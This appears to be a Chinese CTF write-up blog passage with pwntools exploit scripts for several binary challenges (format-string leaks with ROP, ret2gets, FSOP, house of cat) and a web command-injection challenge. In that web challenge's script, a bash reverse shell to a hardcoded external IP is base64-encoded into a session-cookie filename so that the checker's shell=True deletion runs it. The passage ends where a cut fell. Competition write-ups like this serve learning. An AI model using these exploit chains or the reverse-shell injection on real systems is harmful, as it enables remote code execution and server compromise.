<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.c&#x27;,21960)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDB</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDBR</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, gdbscript=<span class="string">f&quot;b *$rebase(<span class="subst">&#123;script&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt64</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ph</span>(<span class="params">var</span>):</span><br><span class="line">    var_name = [name <span class="keyword">for</span> name, value <span class="keyword">in</span> <span class="built_in">globals</span>().items() <span class="keyword">if</span> value <span class="keyword">is</span> var][<span class="number">0</span>]</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span>  &gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(var)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> a,b=<span class="literal">False</span> : p.recvuntil(a,drop=b)</span><br><span class="line">rl  = <span class="keyword">lambda</span>    :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input your name: &quot;</span>)</span><br><span class="line"><span class="comment"># 0x7fffffffd6b0</span></span><br><span class="line"><span class="comment"># 0x7fffffffd590</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">b&#x27;%61$p%10$p%68$p&#x27;</span></span><br><span class="line"><span class="comment">#GDBR(0x1478)</span></span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">libc_base = fmt64() - <span class="number">0x2a28b</span></span><br><span class="line">ph(libc_base)</span><br><span class="line"></span><br><span class="line">stack = fmt64() - <span class="number">0x128</span> + <span class="number">0x118</span> - <span class="number">0x120</span></span><br><span class="line">ph(stack)</span><br><span class="line"></span><br><span class="line">pie = fmt64() - <span class="number">0x11a0</span></span><br><span class="line">ph(pie)</span><br><span class="line"><span class="comment"># rbp 0x7fffffffd590</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000010f78b</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000110a7d</span></span><br><span class="line"><span class="comment">#0x000000000019739c: add rdx, rdi; test eax, eax; jne 0x196ee1; ret; </span></span><br><span class="line"><span class="comment">#0x00000000000ab8a1: pop rdx; or byte ptr [rcx - 0xa], al; ret; </span></span><br><span class="line">pop_rcx = <span class="number">0x00000000000a877e</span> + libc_base</span><br><span class="line">pop_rdx = <span class="number">0x00000000000ab8a1</span> + libc_base</span><br><span class="line">add_rdx_rdi = libc_base + <span class="number">0x000000000019739c</span></span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi) + p64(stack +<span class="number">0x10</span>+ <span class="number">0x200</span>-<span class="number">0x2f8</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(stack + <span class="number">0x300</span>)+ p64(pop_rcx)+p64(stack) +p64(pop_rdx)+p64(<span class="number">0x100</span>) + p64(read)</span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(stack + <span class="number">0x300</span>)+ p64(pop_rcx)+p64(stack) +p64(pop_rdx)+p64(<span class="number">0x100</span>) + p64(write)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rbp = libc_base + <span class="number">0x0000000000028a91</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x00000000000299d2</span></span><br><span class="line">rop2 = p64(pop_rdi) + p64(<span class="number">0</span>)  + p64(pop_rcx) + p64(stack) + p64(pop_rdx) + p64(<span class="number">0x100</span>)+p64(read) + p64(pop_rbp) + p64(stack + <span class="number">0x400</span>-<span class="number">8</span>+<span class="number">0x1a0</span>-<span class="number">0x738</span>-<span class="number">8</span>) + p64(leave_ret) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x3b88</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xec</span>).encode() + <span class="string">b&#x27;c%22$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack &amp; <span class="number">0xffff</span>)+<span class="number">0x28</span>-<span class="number">0xec</span>).encode() + <span class="string">b&#x27;c%21$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += rop2</span><br><span class="line">payload += p64(stack)</span><br><span class="line">payload += p64(stack+<span class="number">8</span>)</span><br><span class="line"><span class="comment">#GDBR(0x014BE)</span></span><br><span class="line"><span class="comment">#GDB(&quot;b *(printf+174)&quot;)</span></span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sd(rop)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Uni-check"><a href="#Uni-check" class="headerlink" title="Uni_check"></a>Uni_check</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">delete_cmd = <span class="string">f&quot;rm -f <span class="subst">&#123;self.base_dir&#125;</span>/<span class="subst">&#123;fname&#125;</span>&quot;</span></span><br><span class="line">subprocess.run(</span><br><span class="line">    delete_cmd,</span><br><span class="line">    shell=<span class="literal">True</span>,  <span class="comment"># &lt;--- 致命错误点</span></span><br><span class="line">    capture_output=<span class="literal">True</span>,</span><br><span class="line">    text=<span class="literal">True</span>,</span><br><span class="line">    timeout=<span class="number">10</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>check.py 文件漏洞点，如果攻击者能够创建一个文件名包含 Shell 特殊字符的文件，当 <code>IntegrityChecker</code> 扫描并试图删除这个”非法文件”时，它实际上会执行攻击者嵌入的命令。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================= 配置区域 =================</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://nc1.ctfplus.cn:16813&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的公网监听地址 (千万别写 127.0.0.1)</span></span><br><span class="line">MY_IP = <span class="string">&quot;47.98.239.105&quot;</span>  <span class="comment"># &lt;--- 修改这里</span></span><br><span class="line">MY_PORT = <span class="string">&quot;8888&quot;</span>     <span class="comment"># &lt;--- 修改这里</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 构造反弹 Shell 命令</span></span><br><span class="line">rev_shell_cmd = <span class="string">f&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="subst">&#123;MY_IP&#125;</span>/<span class="subst">&#123;MY_PORT&#125;</span> 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Raw Command: <span class="subst">&#123;rev_shell_cmd&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Base64 编码 (防止特殊字符被 WAF 拦截)</span></span><br><span class="line">b64_cmd = base64.b64encode(rev_shell_cmd.encode()).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 构造最终文件名 Payload</span></span><br><span class="line"><span class="comment"># 还是用 ../ 跳到 webapp 目录，利用 Check 脚本的删除操作触发执行</span></span><br><span class="line"><span class="comment"># 核心逻辑: echo base64 | base64 -d | sh</span></span><br><span class="line">payload = <span class="string">f&quot;../$(echo$&#123;&#123;IFS&#125;&#125;<span class="subst">&#123;b64_cmd&#125;</span>|base64$&#123;&#123;IFS&#125;&#125;-d|sh)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Encoded Session Payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># ===========================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># 第一步：注入恶意 Session (创建文件)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[1] Injecting Payload...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/&quot;</span>, cookies=&#123;<span class="string">&quot;session&quot;</span>: payload&#125;, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二步：触发 Check (执行命令)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[2] Triggering Execution... (Check your NC listener!)&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 因为反弹 Shell 会阻塞连接，所以这里设置极短超时，或者忽略错误</span></span><br><span class="line">        requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/check&quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Timeout occurred (This is GOOD! It means the shell is hanging/connected)&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Request status: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<p>我们可以利用 session 会创建一个文件保存在 cookies 的机制，我们把 session 变成一个经过特殊构造的文件名，这样，它就会执行我的文件名对应的命令，通过打反弹shell，我们就可以拿到服务器上的 flag 。</p>
<h3 id="Sur-prize"><a href="#Sur-prize" class="headerlink" title="Sur prize"></a>Sur prize</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NWVkODExMDMwYWQ5NzU1Y2Y5N2U3Y2JjNTE3NDdhOGJfZ1BsRVRvamZVZ0F2bzZsTlNQMzg4WUtWaDlmeUVJZEJfVG9rZW46U3NLMWJWMmx5b3ByaWR4TzhRSWNtTUVrbmJ2XzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>看到这个 gets 就猜测到考点是 ret2gets ，通过这种手法，我们就可以合理的控制 rdi 地址上的值。</p>
<p>而且还给了我们两个特殊函数 ls 和 cat filename ，我们先用 ls 查看靶机上面的 flag 名称，然后再利用 cat 函数控制好 rdi ，然后进行一个简单的 cat 操作即可 。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.cn&#x27;,27596)</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> a,b=<span class="literal">False</span> : p.recvuntil(a,drop=b)</span><br><span class="line">rl  = <span class="keyword">lambda</span>    :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">gets = <span class="number">0x401778</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload = b&#x27;a&#x27;*1+p64(gets)+p64(gets)+p64(0x6161616161616161)+p64(gets+0x10) + p64(0x4016A6)*0x20</span></span><br><span class="line"><span class="string">#GDB(&quot;b *0x401778&quot;)</span></span><br><span class="line"><span class="string">sl(payload)</span></span><br><span class="line"><span class="string">payload2=b&#x27;flag&#x27;+p32(0)+b&#x27;B&#x27;*0x60</span></span><br><span class="line"><span class="string">sl(payload2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#GDB(&quot;b *0x401778&quot;)</span></span><br><span class="line">ls = <span class="number">0x401653</span></span><br><span class="line">cat = <span class="number">0x4016A2</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">bss = elf.bss() + <span class="number">0x800</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p64(gets)+p64(bss)*<span class="number">0x7</span>+p64(cat)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2=b&#x27;flag&#x27;+ chr(ord(b&#x27;_&#x27;)+1)+ b&#x27;45177512be97f6fd99eb4e96d5a7bde8&#x27;</span></span><br><span class="line">payload2 = <span class="string">b&#x27;flag&#x27;</span> + <span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">b&#x27;_&#x27;</span>) + <span class="number">1</span>]) + <span class="string">b&#x27;45177512be97f6fd99eb4e96d5a7bde8&#x27;</span></span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="EZIO"><a href="#EZIO" class="headerlink" title="EZIO"></a>EZIO</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OWExY2Q5NmEzMTllNTZjNDBkM2FkOWVhOWQ1MTMwNjhfeHZHdHhCaEFXa0tuT1J5elIyNERBcVFHbEV6R1BrVG5fVG9rZW46VVhBcmJGVHAwb0pmcW54UzdVUmNLblNzbjExXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>考点比较简单，glibc2.23版本的 fsop ，给了一个后门函数，我们直接控制好 vtable 执行shellcode即可 。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.cn&#x27;,14206)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDB</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDBR</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, gdbscript=<span class="string">f&quot;b *$rebase(<span class="subst">&#123;script&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> a,b=<span class="literal">False</span> : p.recvuntil(a,drop=b)</span><br><span class="line">rl  = <span class="keyword">lambda</span>    :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">back = <span class="number">0x4011CE</span></span><br><span class="line">buf = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">IO = flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x8</span> : <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x28</span> : <span class="number">0x1</span>,</span><br><span class="line"><span class="number">0x88</span> : buf + <span class="number">0x30</span>,</span><br><span class="line"><span class="number">0xd8</span> : buf + <span class="number">0xd8</span>,</span><br><span class="line">&#125;,</span><br><span class="line">filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = IO + p64(back)*<span class="number">0x3</span></span><br><span class="line"><span class="comment">#GDB(&quot;b *(fclose+284)&quot;)</span></span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="简单的pwn"><a href="#简单的pwn" class="headerlink" title="简单的pwn"></a>简单的pwn</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YTczMjNiZGI4NjdmZTkyODA5NjE4YWRlMDE0MWU3ZjZfdlRTTFVRTFk5aGNpcHNSb0hRSmlLR3ZVSkZ5Wk5zamVfVG9rZW46STJRa2JidVpmbzZFYnp4Wm03MGNESVNCbnNnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>这有个任意泄露 ，我选择泄露libc地址。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MDk2OGIzYTkxNjc4N2I4NTQ4NGFmOTE0NmUxMjM1YTFfSUxiSDFUaW45QlZINTFzNUtGZ21mNkxIcTdKS1ZDazJfVG9rZW46UDlRVWJXcnNWb1cyUk94SDdOUmNOdjBZbmhoXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>任意地址写，但是由于读入长度限制，我们无法控制 flags 位，所以我们可以打 house of cat ，这个不需要控制 flags 位，还是比较简单的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 